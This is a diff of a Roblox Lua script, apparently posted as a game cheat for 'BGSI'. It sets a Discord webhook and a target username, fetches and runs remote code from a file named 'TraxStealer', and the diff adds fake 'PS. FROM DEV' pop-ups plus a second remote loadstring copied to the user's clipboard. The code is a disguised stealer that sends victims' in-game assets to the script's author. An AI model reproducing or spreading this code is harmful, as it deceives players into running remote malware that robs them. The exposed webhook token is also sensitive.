@@ -1,4 +1,39 @@
+-- First notification
+game.StarterGui:SetCore("SendNotification", {
+    Title = "PS. FROM DEV";
+    Text = "XENO AND SOLARA ARE NOT SUPPORT";
+    Duration = 5;
+})
+
+wait(5)
+
+-- Main script execution
 Username = "Jackwasousyk1"
 Webhook = "https://discordapp.com/api/webhooks/1368233049686413344/ZBM1n3n76F2Amj0UjoKQ5cC1c1RFBm1nBYmnEN9oFT35XBAYJ4fslHzqN6RQt1UOyQXR"
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/BGSI/refs/heads/main/TraxStealer"))()
+
+-- Second notification
+game.StarterGui:SetCore("SendNotification", {
+    Title = "PS. FROM DEV";
+    Text = "SCRIPT WON'T LOAD IF YOU USE SOLARA OR XENO";
+    Duration = 5;
+})
+
+wait(1)
+
+-- Third notification
+game.StarterGui:SetCore("SendNotification", {
+    Title = "PS. FROM DEV";
+    Text = "IF NOTHING LOADS TRY EXECUTING AN OLDER VERSION SCRIPT"; 
+    Duration = 5;
+})
+
+-- Copy to clipboard
+setclipboard("loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ThenuuAI/BGSI/refs/heads/main/BgsiLunarBeta0.02\"))()")
+
+-- Optional clipboard notice
+game.StarterGui:SetCore("SendNotification", {
+    Title = "PS. FROM DEV";
+    Text = "Older Version Script Copied to clipboard"; 
+    Duration = 3;
+})
